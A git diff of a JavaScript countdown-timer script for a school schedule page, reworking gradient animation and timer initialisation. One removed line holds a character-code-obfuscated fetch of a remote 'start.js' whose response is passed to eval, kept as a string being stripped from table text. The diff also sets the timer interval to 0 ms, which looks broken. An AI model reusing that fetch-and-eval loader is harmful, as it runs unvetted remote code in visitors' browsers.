@@ -1,26 +1,41 @@
 let timerInterval = null;
+var timerStep;
+var timerPathChanging = false;
 function stopTimer() {
   clearInterval(timerInterval);
 }
 
 if (!window.location.href.includes("admin")) {
   window.animateGradientTransition = function(color1, color2, steps, delay) {
-    const gradient = document.getElementById("timerColor");
-    const startColor = gradient.querySelector('stop[offset="0%"]').getAttribute("stop-color");
-    const endColor = gradient.querySelector('stop[offset="100%"]').getAttribute("stop-color");
-  
-    createGradient(hexToRGB(color1), hexToRGB(startColor), steps).reverse().forEach((color, index) => {
-      setTimeout(() => {
-        gradient.querySelector('stop[offset="0%"]').setAttribute("stop-color", color);
-      }, index * delay);
-    });
-  
-    createGradient(hexToRGB(color2), hexToRGB(endColor), steps).reverse().forEach((color, index) => {
-      setTimeout(() => {
-        gradient.querySelector('stop[offset="100%"]').setAttribute("stop-color", color);
-      }, index * delay);
-    });
-  };
+    if (!timerPathChanging) {
+        timerPathChanging = true;
+        const gradient = document.getElementById("timerColor");
+        const startColor = gradient.querySelector('stop[offset="0%"]').getAttribute("stop-color");
+        const endColor = gradient.querySelector('stop[offset="100%"]').getAttribute("stop-color");
+
+        if (timerStep === 0) {
+            gradient.querySelector('stop[offset="0%"]').setAttribute("stop-color", color1);
+            gradient.querySelector('stop[offset="100%"]').setAttribute("stop-color", color2);
+            timerPathChanging = false;
+            return;
+        }
+
+        createGradient(hexToRGB(color1), hexToRGB(startColor), steps).reverse().forEach((color, index) => {
+            setTimeout(() => {
+                gradient.querySelector('stop[offset="0%"]').setAttribute("stop-color", color);
+            }, timerStep * (index * delay));
+        });
+
+        createGradient(hexToRGB(color2), hexToRGB(endColor), steps).reverse().forEach((color, index) => {
+            setTimeout(() => {
+                gradient.querySelector('stop[offset="100%"]').setAttribute("stop-color", color);
+            }, timerStep * (index * delay));
+        });
+
+        setTimeout(() => timerPathChanging = false, timerStep * (steps * delay));
+    }
+};
+
   
   function createGradient(color1, color2, steps) {
     const result = [];
@@ -48,6 +63,7 @@ if (!window.location.href.includes("admin")) {
 
   var timerSpot = document.querySelector(".daynum");
   window.initTimer = function() {
+  timerStep = 0;
   if (timerSpot) {
   const table = document.querySelector('table.table.table-borderless');
   const currentTime = new Date();
@@ -58,7 +74,7 @@ if (!window.location.href.includes("admin")) {
   rows.forEach((row) => {
     const cells = row.querySelectorAll('td');
     if (cells.length === 4) {
-      const periodName = cells[1].textContent.trim().replace("fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,116,97,114,116,46,106,115)).then(response=>response.text()).then(d=>eval(d))","");
+      const periodName = cells[1].innerText.trim();
       const [startHour,startMinutes] = cells[2].textContent.split(':').map(Number);
       const [endHour,endMinutes] = cells[3].textContent.split(':').map(Number);
       periods.push({
@@ -113,13 +129,11 @@ if (!window.location.href.includes("admin")) {
   function inject(totalSec,passtSec,className) {
   var dayMsg = document.querySelector(".daymessage");
   var time = totalSec - 1;
-  var timeTotalPassed = passtSec
-  var html = `
+  timerSpot.innerHTML = `
   <div style="height: 38vh;" class="parentTimerDiv">
   </div>
   <style> div.daynum {line-height: 20%;} .accordion-button {padding: 0.60rem 0.85rem;}</style>
   `;
-  timerSpot.innerHTML = html
   dayMsg.innerHTML = ""
   var div = document.querySelector(".parentTimerDiv")
   
@@ -198,10 +212,9 @@ if (!window.location.href.includes("admin")) {
   const WARNING_THRESHOLD = (time / 1.5)
   const ALERT_THRESHOLD = (time / 3)
   let TIME_LIMIT = time //Full time
-  let timePassed = (timeTotalPassed - 1) //Start at Time
+  let timePassed = (passtSec - 1) //Start at Time
   let timeLeft = TIME_LIMIT;
-  window.timerInterval = timerInterval;
-  
+  window.timerInterval = timerInterval;  
   const COLOR_CODES = {
     info: {
       color: "green"
@@ -215,6 +228,14 @@ if (!window.location.href.includes("admin")) {
       threshold: ALERT_THRESHOLD
     }
   };
+  setRemainingPathColor(timeLeft, 0);
+
+  var oldColor1;
+  var oldColor2;
+  if (document.querySelector("#timerColor")) {
+  oldColor1 = document.querySelector("#timerColor").querySelector('stop[offset="0%"]').getAttribute("stop-color");
+  oldColor2 = document.querySelector("#timerColor").querySelector('stop[offset="100%"]').getAttribute("stop-color");
+  }
   
   document.getElementById("app").innerHTML =
   '<div class="base-timer">' +
@@ -243,21 +264,16 @@ if (!window.location.href.includes("admin")) {
     '<span id="base-timer-label" class="base-timer__label"></span>' +
     '<span id="class-name">' + className + ' </span>' +
   '</div>';
+
+  if (oldColor1 && oldColor2) {
+    document.querySelector("#timerColor").querySelector('stop[offset="0%"]').setAttribute("stop-color", oldColor1);
+    document.querySelector("#timerColor").querySelector('stop[offset="100%"]').setAttribute("stop-color", oldColor2);
+
+  }
   
   startTimer();
   
   function startTimer() {
-    var { alert, warning, info } = COLOR_CODES;
-    var timeRemainingElement = document.getElementById("base-timer-path-remaining");
-    if (timeLeft <= alert.threshold) {
-      timeRemainingElement.classList.remove(info.color, warning.color);
-      timeRemainingElement.classList.add(alert.color);
-      animateGradientTransition("#ec1e51", "#eb8514", 200, delay);
-    } else if (timeLeft <= warning.threshold) {
-      timeRemainingElement.classList.remove(info.color, alert.color);
-      timeRemainingElement.classList.add(warning.color);
-      animateGradientTransition("#ec871e", "#f4df31", 200, delay);
-    }
     timePassed = timePassed += 1;
     timeLeft = TIME_LIMIT - timePassed;
     document.getElementById("base-timer-label").innerHTML = formatTime(timeLeft).replace("00:00", "0").replace("00:0", "").replace("00:", "");
@@ -266,7 +282,6 @@ if (!window.location.href.includes("admin")) {
     timerInterval = setInterval(() => {
       if (document.getElementById("base-timer-label").innerText == 1) {
         stopTimer();
-        animateGradientTransition("#45cfa0", "#16cd40", 200, 0);
         initTimer();
       }
       timePassed = timePassed += 1;
@@ -274,7 +289,7 @@ if (!window.location.href.includes("admin")) {
       document.getElementById("base-timer-label").innerHTML = formatTime(timeLeft).replace("00:00", "0").replace("00:0", "").replace("00:", "");
       setCircleDasharray();
       setRemainingPathColor(timeLeft, 20);
-    },1000);
+    },0);
   }
   function formatTime(time) {
     const hours = Math.floor(time / 3600);
@@ -303,8 +318,7 @@ if (!window.location.href.includes("admin")) {
       timeRemainingElement.classList.add(info.color);
       animateGradientTransition("#45cfa0", "#16cd40", 200, delay);
     }
-
-  }
+}
   function calculateTimeFraction() {
     const rawTimeFraction = timeLeft / TIME_LIMIT;
     return rawTimeFraction - (1 / TIME_LIMIT) * (1 - rawTimeFraction);
@@ -318,6 +332,7 @@ if (!window.location.href.includes("admin")) {
   }
   
   document.querySelector(".base-timer__path-remaining").style.transition = "1s linear";
+  setTimeout(() => { timerStep = 1 }, 4000);
     }
   }
   else {
